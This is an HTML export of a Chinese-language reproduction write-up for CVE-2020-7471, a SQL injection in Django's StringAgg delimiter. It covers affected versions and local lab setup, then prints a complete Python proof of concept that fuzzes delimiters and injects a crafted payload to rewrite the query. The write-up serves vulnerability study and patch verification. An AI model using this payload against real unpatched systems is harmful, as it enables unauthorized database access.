<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs63189908{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:decimal;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2020-7471django-sql注入漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2020-7471</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Django sql</span><span class="csECDA2D3">注入漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Django</span><span class="cs9C1B1871">是高水准的由</span><span class="cs8926E06">Python</span><span class="cs9C1B1871">编程语言驱动的一个开源</span><span class="cs8926E06">Web</span><span class="cs9C1B1871">应用程序框架，起源于开源社区。使用</span><span class="cs8926E06">Django</span><span class="cs9C1B1871">，程序员可以方便、快捷地创建高品质、易维护、数据库驱动的应用程序，应用广泛。</span><span class="cs8926E06">2020</span><span class="cs9C1B1871">年</span><span class="cs8926E06">2</span><span class="cs9C1B1871">月初，</span><span class="cs8926E06">Django </span><span class="cs9C1B1871">官方发布安全通告公布了一个通过</span><span class="cs8926E06">StringAgg</span><span class="cs9C1B1871">（分隔符）实现利用的潜在</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">注入漏洞（</span><span class="cs8926E06">CVE-2020-7471</span><span class="cs9C1B1871">）。攻击者可通过构造分隔符传递给聚合函数</span><span class="cs8926E06">contrib.postgres.aggregates.StringAgg</span><span class="cs9C1B1871">，从而绕过转义并注入恶意</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">语句</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Django 1.11.x &lt; 1.11.28<br/>Django 2.2.x &lt; 2.2.10<br/>Django 3.0.x &lt; 3.0.3<br/>Django </span><span class="cs9C1B1871">主开发分支</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="环境安装"><span class="csD6CA00D2">环境安装</span></a></h3>
		<ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs9C1B1871">安装</span><span class="cs8926E06"> django </span><span class="cs9C1B1871">漏洞版本，我测试用的是</span></li></ol>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9FB05234">pip install django==3.0.2 -i https://pypi.tuna.tsinghua.edu.cn/simple</span></li></ul>
		<ol start="2" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs9C1B1871">参考</span><span class="cs8926E06"> https://www.runoob.com/postgresql/windows-install-postgresql.html </span><span class="cs9C1B1871">完成</span><span class="cs8926E06"> postgres </span><span class="cs9C1B1871">数据库的安装</span></li><li class="cs63189908"><span class="cs9C1B1871">新建数据库</span></li></ol>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9FB05234">CREATE DATABASE test;</span></li></ul>
		<ol start="4" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs9C1B1871">修改</span><span class="cs8926E06"> sqlvul_projects/settings.py </span><span class="cs9C1B1871">里面的数据库配置，如果上一步你安装用的默认配置（包括设置密码为</span><span class="cs8926E06">postgres</span><span class="cs9C1B1871">），就无需修改任何配置，可以跳过这一步</span></li></ol>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9FB05234">DATABASES = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;default&#39;: {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;ENGINE&#39;: &#39;django.db.backends.postgresql&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;NAME&#39;: &#39;test&#39;, &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# </span><span class="cs7FFD2630">数据库名称</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;USER&#39;: &#39;postgres&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;PASSWORD&#39;: &#39;postgres&#39;, # </span><span class="cs7FFD2630">数据库用户密码</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;HOST&#39;: &#39;127.0.0.1&#39;, &nbsp;&nbsp;&nbsp;# </span><span class="cs7FFD2630">数据库地址</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;PORT&#39;: &#39;5432&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></li></ul>
		<ol start="5" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs9C1B1871">通过</span><span class="cs8926E06"> django </span><span class="cs9C1B1871">初始化数据表</span></li></ol>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9FB05234">python3 manage.py migrate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">python3 manage.py makemigrations vul_app</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">python3 manage.py migrate vul_app</span></li></ul>
		<h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234"># encoding:utf-8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import os</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import django</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">os.environ.setdefault(&quot;DJANGO_SETTINGS_MODULE&quot;, &quot;sqlvul_project.settings&quot;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Django </span><span class="cs7FFD2630">版本大于等于</span><span class="cs9FB05234">1.7</span><span class="cs7FFD2630">的时候，需要加上下面两句</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if django.VERSION &gt;= (1, 7):#</span><span class="cs7FFD2630">自动判断版本</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;django.setup()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">from vul_app.models import Info</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from django.contrib.postgres.aggregates import StringAgg</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from django.db.models import Count</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">&quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">postgres </span><span class="cs7FFD2630">预先执行的</span><span class="cs9FB05234">SQL</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">CREATE DATABASE test;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">\c test;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">\d </span><span class="cs7FFD2630">列出当前数据库的所有表格</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&quot;&quot;&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def initdb():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;data = [(&#39;li&#39;,&#39;male&#39;),(&#39;zhao&#39;,&#39;male&#39;),(&#39;zhang&#39;,&#39;female&#39;)]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for name,gender in data:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Info.objects.get_or_create(name=name,gender=gender)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def query():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# FUZZ delimiter</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;error_c = []</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;other_error_c = []</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for c in &quot;!@#$%^&amp;*()_+=-|\\\&quot;&#39;:;?/&gt;.&lt;,{}[]&quot;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;results = Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname=StringAgg(&#39;name&#39;,delimiter=c))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for e in results:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pass</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except IndexError:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_c.append(c)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;other_error_c.append(c)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(error_c)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(other_error_c)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def query_with_evil():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;&#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">注入点证明</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">分别设置</span><span class="cs9FB05234">delimiter</span><span class="cs7FFD2630">为</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">单引号</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">二个单引号</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">二个双引号</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">尝试注释后面的内容</span><span class="cs9FB05234"> &#39;)--</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;:return:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;&#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[+]</span><span class="cs7FFD2630">正常的输出：</span><span class="cs9FB05234">&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;payload = &#39;-&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;results = Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname=StringAgg(&#39;name&#39;, delimiter=payload))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for e in results:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(e)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[+]</span><span class="cs7FFD2630">注入后的的输出：</span><span class="cs9FB05234">&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;payload = &#39;-\&#39;) AS &quot;mydefinedname&quot; FROM &quot;vul_app_info&quot; GROUP BY &quot;vul_app_info&quot;.&quot;gender&quot; LIMIT 1 OFFSET 1 -- &#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;results = Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname=StringAgg(&#39;name&#39;, delimiter=payload))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for e in results:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(e)</span><span class="cs8926E06"><br/><br/><br/><br/></span><span class="cs9FB05234">if __name__ == &#39;__main__&#39;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(django.VERSION) # </span><span class="cs7FFD2630">测试版本</span><span class="cs9FB05234"> 3.0.2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;initdb()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;query()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;query_with_evil()</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后运行</span><span class="cs8926E06"> POC </span><span class="cs9C1B1871">脚本</span><span class="cs9FB05234">CVE-2020-7471.py</span><span class="cs9C1B1871">就可以了</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">漏洞环境及其</span><span class="cs8926E06">poc</span><span class="cs9C1B1871">下载地址：</span><span class="cs8926E06">https://github.com/ianxtianxt/CVE-2020-7471</span></p></body>
</html>
